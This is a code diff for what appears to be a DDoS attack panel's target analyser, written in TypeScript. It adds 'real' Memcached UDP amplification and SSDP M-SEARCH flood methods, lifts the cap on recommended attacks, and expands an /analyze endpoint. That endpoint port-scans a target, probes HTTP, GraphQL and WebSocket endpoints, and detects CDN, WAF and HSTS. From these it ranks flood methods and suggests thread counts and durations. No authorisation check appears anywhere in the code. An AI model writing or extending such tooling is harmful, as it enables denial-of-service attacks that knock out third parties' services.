-      reason: `51,000x amplification — responsible for 1.7Tbps attacks; effective against exposed Memcached (port 11211)`,
-      suggestedThreads: 512, suggestedDuration: 30,
-      protocol: "UDP", amplification: 51000, simulated: true,
+      reason: `Real Memcached binary protocol UDP — get+stats to port 11211. Exposed Memcached servers common in hosting environments.`,
+      suggestedThreads: 512, suggestedDuration: 30, protocol: "UDP/Memcached", amplification: 51000, simulated: true,
     });
   }
 
-  // Sort real methods above simulated ones at equal score
+  // ── SSDP M-SEARCH Flood ────────────────────────────────────────────────
+  {
+    const score = isCDN ? 44 : (isIP ? 72 : 60);
+    recs.push({
+      method: "ssdp-amp", name: "SSDP M-SEARCH Flood [UPnP]",
+      score, tier: tierFromScore(score),
+      reason: `Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion on network devices`,
+      suggestedThreads: 512, suggestedDuration: 60, protocol: "UDP/SSDP", amplification: 1,
+    });
+  }
+
+  // Deduplicate and sort: real methods above simulated at equal score, all returned (no limit)
   return recs.sort((a, b) => {
     if (b.score !== a.score) return b.score - a.score;
-    // Tie-break: real > simulated
     return (a.simulated ? 1 : 0) - (b.simulated ? 1 : 0);
-  }).slice(0, 8);
+  });
+}
+
+// ── Probe a single endpoint ────────────────────────────────────────────────
+async function probeHTTP(scheme: string, hostname: string): Promise<{
+  ok: boolean; timeMs: number; server: string; headers: Headers | null; body: string;
+}> {
+  const start = Date.now();
+  try {
+    const r = await fetch(`${scheme}://${hostname}`, {
+      method: "GET",
+      signal: AbortSignal.timeout(8000),
+      redirect: "follow",
+    });
+    let body = "";
+    try {
+      const text = await r.text();
+      body = text.slice(0, 2000);
+    } catch { /* ignore */ }
+    return { ok: true, timeMs: Date.now() - start, server: r.headers.get("server") || "", headers: r.headers, body };
+  } catch {
+    return { ok: false, timeMs: Date.now() - start, server: "", headers: null, body: "" };
+  }
+}
+
+// ── Quick GraphQL probe ────────────────────────────────────────────────────
+async function probeGraphQL(baseUrl: string): Promise<boolean> {
+  const paths = ["/graphql", "/api/graphql", "/gql", "/api/gql", "/v1/graphql"];
+  const results = await Promise.all(paths.map(async p => {
+    try {
+      const r = await fetch(`${baseUrl}${p}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ query: "{ __typename }" }),
+        signal: AbortSignal.timeout(4000),
+      });
+      const ct = r.headers.get("content-type") || "";
+      if (ct.includes("json") || r.status === 200 || r.status === 400) return true;
+      return false;
+    } catch { return false; }
+  }));
+  return results.some(Boolean);
+}
+
+// ── WebSocket upgrade probe ────────────────────────────────────────────────
+function detectWebSocketSupport(headers: Headers): boolean {
+  const upgrade = (headers.get("upgrade") || "").toLowerCase();
+  const allow   = (headers.get("allow") || "").toLowerCase();
+  return upgrade.includes("websocket") || allow.includes("websocket");
 }
 
 router.post("/analyze", async (req, res): Promise<void> => {
@@ -386,87 +630,127 @@ router.post("/analyze", async (req, res): Promise<void> => {
   }
 
   let { url } = parsed.data;
-  if (!url.trim()) {
-    res.status(400).json({ error: "URL required" });
-    return;
-  }
+  if (!url.trim()) { res.status(400).json({ error: "URL required" }); return; }
 
   let hostname = url.trim();
+  let originalScheme = "http";
   try {
     const u = new URL(hostname.startsWith("http") ? hostname : `http://${hostname}`);
     hostname = u.hostname;
+    originalScheme = u.protocol.replace(":", "");
   } catch { /* keep as-is */ }
 
   const isIPv4 = /^\d{1,3}(\.\d{1,3}){3}$/.test(hostname);
 
+  // DNS resolution
   let resolvedIp: string | null = null;
   let hasDNS = false;
+  let allIPs: string[] = [];
   if (!isIPv4) {
     try {
       const addrs = await dns.resolve4(hostname);
       resolvedIp = addrs[0] ?? null;
+      allIPs = addrs;
       hasDNS = true;
-    } catch { /**/ }
+    } catch { /* no DNS */ }
   }
 
   const ip = isIPv4 ? hostname : resolvedIp;
 
-  let httpAvailable = false;
+  // Parallel port scan + HTTP probes
+  const commonPorts = [80, 443, 8080, 8443, 3000, 8888, 9000];
+  const [portScanResult, httpResult, httpsResult] = await Promise.all([
+    ip ? scanPorts(ip, commonPorts) : Promise.resolve([] as number[]),
+    probeHTTP("http",  hostname),
+    probeHTTP("https", hostname),
+  ]);
+
+  let httpAvailable  = false;
   let httpsAvailable = false;
   let responseTimeMs = 0;
-  let serverHeader = "";
-  let isCDN = false;
-  let cdnProvider = "";
+  let serverHeader   = "";
+  let isCDN          = false;
+  let cdnProvider    = "";
+  let hasWAF         = false;
+  let wafProvider    = "";
+  let supportsH2     = false;
+  let supportsH3     = false;
+  let altSvc         = "";
+  let hasHSTS        = false;
+  let hstsMaxAge     = 0;
   let capturedHeaders: Headers | null = null;
-  const openPorts: number[] = [];
-
-  async function probeHTTP(scheme: string): Promise<{ ok: boolean; timeMs: number; server: string; headers: Headers | null }> {
-    const start = Date.now();
-    try {
-      const r = await fetch(`${scheme}://${hostname}`, {
-        method: "GET",
-        signal: AbortSignal.timeout(8000),
-        redirect: "follow",
-      });
-      return { ok: true, timeMs: Date.now() - start, server: r.headers.get("server") || "", headers: r.headers };
-    } catch {
-      return { ok: false, timeMs: Date.now() - start, server: "", headers: null };
-    }
-  }
-
-  const [httpResult, httpsResult] = await Promise.all([probeHTTP("http"), probeHTTP("https")]);
+  let capturedBody   = "";
 
   if (httpResult.ok) {
     httpAvailable = true;
-    openPorts.push(80);
     responseTimeMs = httpResult.timeMs;
     serverHeader = httpResult.server;
     capturedHeaders = httpResult.headers;
+    capturedBody = httpResult.body;
     if (httpResult.headers) {
       const cdn = detectCDN(httpResult.headers);
       isCDN = cdn.isCDN; cdnProvider = cdn.provider;
+      const h = detectHTTPVersions(httpResult.headers);
+      supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = h.altSvc;
+      const hsts = detectHSTS(httpResult.headers);
+      hasHSTS = hsts.hasHSTS; hstsMaxAge = hsts.maxAge;
     }
   }
+
   if (httpsResult.ok) {
     httpsAvailable = true;
-    openPorts.push(443);
     if (!httpAvailable) {
       responseTimeMs = httpsResult.timeMs;
       serverHeader = httpsResult.server;
       capturedHeaders = httpsResult.headers;
+      capturedBody = httpsResult.body;
       if (httpsResult.headers) {
         const cdn = detectCDN(httpsResult.headers);
         isCDN = cdn.isCDN; cdnProvider = cdn.provider;
+        const h = detectHTTPVersions(httpsResult.headers);
+        supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = h.altSvc;
+        const hsts = detectHSTS(httpsResult.headers);
+        hasHSTS = hsts.hasHSTS; hstsMaxAge = hsts.maxAge;
       }
-    } else if (!isCDN && httpsResult.headers) {
-      const cdn = detectCDN(httpsResult.headers);
-      if (cdn.isCDN) { isCDN = true; cdnProvider = cdn.provider; }
+    } else if (httpsResult.headers) {
+      // Merge CDN/WAF from HTTPS too
+      if (!isCDN) {
+        const cdn = detectCDN(httpsResult.headers);
+        if (cdn.isCDN) { isCDN = true; cdnProvider = cdn.provider; }
+      }
+      if (!supportsH2) {
+        const h = detectHTTPVersions(httpsResult.headers);
+        supportsH2 = h.supportsH2; supportsH3 = h.supportsH3; altSvc = altSvc || h.altSvc;
+      }
     }
   }
 
-  if (hasDNS) openPorts.push(53);
+  // WAF detection from headers + body
+  if (capturedHeaders) {
+    const waf = detectWAF(capturedHeaders, capturedBody);
+    hasWAF = waf.hasWAF; wafProvider = waf.wafProvider;
+  }
 
-  const serverType = detectServerType(serverHeader, capturedHeaders);
+  // WebSocket support
+  const hasWebSocket = capturedHeaders ? detectWebSocketSupport(capturedHeaders) : false;
+
+  // Build open ports: confirmed HTTP probe ports + TCP scan
+  const openPorts: number[] = [];
+  if (httpAvailable)  openPorts.push(80);
+  if (httpsAvailable) openPorts.push(443);
+  if (hasDNS) openPorts.push(53);
+  for (const p of portScanResult) {
+    if (!openPorts.includes(p)) openPorts.push(p);
+  }
+  openPorts.sort((a, b) => a - b);
+
+  // GraphQL probe (fire & forget, quick timeout)
+  const baseUrl = httpsAvailable ? `https://${hostname}` : `http://${hostname}`;
+  const hasGraphQL = (httpAvailable || httpsAvailable)
+    ? await probeGraphQL(baseUrl).catch(() => false)
+    : false;
+
+  const serverType  = detectServerType(serverHeader, capturedHeaders);
   const serverLabel = SERVER_LABELS[serverType];
 
   const recommendations = scoreMethodsFor({
@@ -478,13 +762,22 @@ router.post("/analyze", async (req, res): Promise<void> => {
     serverType,
     isCDN,
     cdnProvider,
+    hasWAF,
+    wafProvider,
     hasDNS,
-  });
+    supportsH2,
+    supportsH3,
+    openPorts,
+    hasGraphQL,
+    hasWebSocket,
+    hostname,
+  } as Parameters<typeof scoreMethodsFor>[0] & { hostname: string });
 
   res.json({
-    target: hostname,
+    target:        hostname,
     ip,
-    isIP: isIPv4,
+    allIPs,
+    isIP:          isIPv4,
     httpAvailable,
     httpsAvailable,
     responseTimeMs,
@@ -493,6 +786,15 @@ router.post("/analyze", async (req, res): Promise<void> => {
     serverLabel,
     isCDN,
     cdnProvider,
+    hasWAF,
+    wafProvider,
+    supportsH2,
+    supportsH3,
+    altSvc,
+    hasHSTS,
+    hstsMaxAge,
+    hasGraphQL,
+    hasWebSocket,
     openPorts,
     recommendations,
   });
